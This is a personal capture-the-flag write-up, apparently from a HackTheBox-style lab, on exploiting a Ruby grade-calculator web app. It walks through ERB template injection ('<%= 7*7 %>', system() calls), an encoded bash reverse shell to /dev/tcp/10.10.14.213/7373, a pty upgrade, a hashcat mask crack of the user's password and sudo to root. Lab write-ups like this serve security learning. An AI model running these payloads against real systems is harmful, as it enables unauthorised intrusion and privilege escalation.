Startign with nmap 

![[Pasted image 20240426212421.png]]

![[Pasted image 20240426212450.png]]

the website dashboard

checked the wappalyzer to find the technologies website is using but couldn't find any 
I tried directory fuzzing 

Found this at the bottom of the website 
![[Pasted image 20240426213331.png]]

![[Pasted image 20240426213613.png]]

![[Pasted image 20240426214622.png]]
we got another info that susan is sysadmin 

we can see this in the about us and there might me a vulnerability on secure coding
![[Pasted image 20240426213729.png]]

there is a input field in the website , there might be a input validation vulnerbility

let's do some rearch on the technologies the website is using WEBrick 
![[Pasted image 20240426214042.png]]

but there is no information about vulnerbilities
![[Pasted image 20240426214204.png]]


the above is the robots.txt file we got something intresting 

now we've gatherd information available in the website the next part will be testing the inputs

![[Pasted image 20240426214927.png]]

i did burpsuite scan to get more information about the vulnerbilities and the results are 

![[Pasted image 20240427175147.png]]

to know how to perform a scan in burpsuite refer to [[scanning with burp scanner]]
so i confirmed that there is a way to bypass the input in the calculator

![[Pasted image 20240427175924.png]]

after adding single '  i got this result 
![[Pasted image 20240427180108.png]]

after bit of research i came to know that it is a SSTI vulnerbility (server side template injection)
refer [[SSTI vulnerbility]] 

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

search for ruby payloads in this website

![[Pasted image 20240427181349.png]]


let's try some payloads and see what happens
![[Pasted image 20240427181523.png]]

we've got same result let's keep trying
to encode select the characters and do ctrl+u to do url encoding
![[Pasted image 20240427183501.png]]

i've multiplied 7* 7 and i got the result 49 so <%= 7* 7 %> payload works 

now let's add a linux command to thi payload to see if it works 

![[Pasted image 20240427184648.png]]

we got susan as the username if we used whoami comamnd here

let's do ls and pwd to knwo the direcotries and present directory
to execute commands use  ` 'these 

![[Pasted image 20240427185000.png]]

we got some details

using revshells.com website i created a python payload and gave me shell access

![[Pasted image 20240427185711.png]]

![[Pasted image 20240427185647.png]]


We can generate payload manually on our terminal refer to [[#Generate Payload]]

![[Pasted image 20240427190139.png]]

to get neat terminal we did 
python3 -c 'import pty; pty.spawn("/bin/bash")'


we got the user flag now

![[Pasted image 20240427190343.png]]

![[Pasted image 20240427190922.png]]

cracking password with hash cat  using this command
```
hashcat -m 1400 <hashhere> -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
```

![[Pasted image 20240428115241.png]]

![[Pasted image 20240428120342.png]]


refer [[Hashcat]] to learn using hashacat

after sometime we finally cracked hashcat password 
susan_nasus_413759210

![[Pasted image 20240428122004.png]]


using sudo bash we switched to root user and got root flag
![[Pasted image 20240428122158.png]]


### Generate Payload

Using hURL to encode and decode payloads demonstrates how we can mess around with data to take advantage of weaknesses in web applications.

Specifically, the payload we’re making for the Weighted Grade Calculator app is made to run a reverse shell command. This way, we can exploit any possible vulnerabilities that let us run code on the server’s side.

```
┌──(kali㉿kali)-[~]
└─$ hURL -B "bash -i >& /dev/tcp/10.10.14.213/7373 0>&1"

Original       :: bash -i >& /dev/tcp/10.10.14.213/7373 0>&1                                                                                                                                                     
base64 ENcoded :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx

┌──(kali㉿kali)-[~]
└─$ hURL -U "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx"

Original    :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx                                                                                                                                          
URL ENcoded :: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx
```

```
category1=a%0A<%25%3Dsystem("ping+-c1+$myIP");%25>
```
the above is the another paylaod from the write up 
![[Pasted image 20240428122943.png]]